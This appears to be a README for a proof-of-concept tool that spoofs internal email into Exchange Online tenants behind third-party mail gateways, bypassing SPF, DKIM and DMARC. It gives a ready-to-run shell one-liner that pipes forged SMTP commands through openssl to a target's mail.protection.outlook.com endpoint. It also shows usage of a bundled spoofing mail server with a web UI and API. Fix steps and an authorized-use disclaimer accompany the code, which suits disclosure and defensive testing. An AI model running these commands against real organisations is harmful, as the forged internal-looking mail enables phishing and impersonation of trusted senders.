# Ghost Sender — Exchange Online Email Spoofing PoC

A proof-of-concept for the **Ghost Sender** vulnerability affecting Exchange Online tenants that use an external MX record (third-party email gateway) without a partner connector or transport rule.

When an external MX is configured, Exchange Online accepts email sent directly to the tenant's M365 EOP endpoint (`domain-com.mail.protection.outlook.com:25`) and delivers it without enforcing SPF, DKIM, or DMARC. Emails appear as internal mail with no external warning banner.

## Background

- **InfoGuard Labs disclosure:** https://labs.infoguard.ch/posts/ghost-sender/
- **Microsoft guidance:** https://techcommunity.microsoft.com/blog/exchange/direct-send-vs-sending-directly-to-an-exchange-online-tenant/4439865

## Files

| File | Description |
|------|-------------|
| `send.sh` | One-liner PoC — single spoofed email |
| `mail-server.py` | Full mail server — web UI on `:8080`, multi-recipient with CC |

## Quick Start — One-Liner PoC

```bash
./send.sh target-domain.com security@target-domain.com victim@target-domain.com
```

Or manually:

```bash
{ echo "EHLO x"; echo "MAIL FROM:<sender@target-domain.com>"; echo "RCPT TO:<recipient@target-domain.com>"; echo "DATA"; echo "From: sender@target-domain.com"; echo "To: recipient@target-domain.com"; echo "Subject: Ghost Sender PoC"; echo ""; echo "SPF/DKIM/DMARC bypassed."; echo "."; echo "QUIT"; sleep 2; } | openssl s_client -connect $(echo target-domain.com | tr '.' '-').mail.protection.outlook.com:25 -starttls smtp -crlf -quiet 2>/dev/null
```

## Mail Server — Web UI + API

```bash
python3 mail-server.py
# Opens web interface at http://localhost:8080
# API: curl -X POST http://localhost:8080/send -d "from=sender@domain.com&to=victim@domain.com&subject=Test&body=Message"
```

Features:
- Web form at `http://localhost:8080`
- Multi-recipient To + CC support
- JSON API
- Direct M365 EOP delivery — bypasses MX, SPF, DKIM, DMARC
- No external dependencies

## Requirements

- Python 3.6+
- Outbound TCP port 25 (not blocked by ISP/cloud provider)
- Clean IP (not on Spamhaus PBL — most residential IPs are)

## How It Works

```
Attacker ──TCP:25──▶ domain-com.mail.protection.outlook.com
                              │
                              │ Exchange Online sees external MX configured
                              │ Trusts inbound mail as "already filtered"
                              │ SPF/DKIM/DMARC checks are skipped
                              │
                              ▼
                         Victim's Inbox
```

The email lands with:
- No external warning banner
- No "via" notation
- Sender profile picture resolved (for internal addresses)
- Appears as genuine internal mail

## Fix

In Exchange Admin Center, implement **one** of:

1. **Partner Organization Connector** — restrict inbound to your gateway's IP ranges
2. **Transport Rule (Priority 0)** — reject external mail not from gateway IPs
3. **Point MX to Exchange Online Protection** — remove the third-party gateway

Full details in the [Microsoft article](https://techcommunity.microsoft.com/blog/exchange/direct-send-vs-sending-directly-to-an-exchange-online-tenant/4439865).

## Authorized Use Only

This tool is for testing your own infrastructure or domains you have written authorization to test. Do not use against systems without explicit permission.
